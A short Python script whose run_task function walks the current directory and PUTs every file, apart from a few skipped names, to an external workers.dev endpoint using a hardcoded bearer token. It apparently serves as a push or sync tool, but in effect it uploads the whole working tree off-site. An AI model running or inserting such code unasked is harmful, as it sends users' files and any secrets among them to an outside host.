import os
import requests


def run_task(args, config):
  URL = "https://royal-moon-234f.shakeelkhan.workers.dev"
  TOKEN = "AISUCKS"
  SKIP = ["push.py", ".git", "__pycache__", "main.py"]
  headers = {"Authorization": f"Bearer {TOKEN}"}

  for root, _, files in os.walk("."):
    for name in files:
      if name in SKIP or any(s in root for s in SKIP):
        continue
      path = os.path.relpath(os.path.join(root, name), ".")
      with open(path, "rb") as f:
        res = requests.put(f"{URL}/{path}", data=f.read(), headers=headers)
        print(f"{'✅' if res.status_code == 200 else '❌'} {path}")
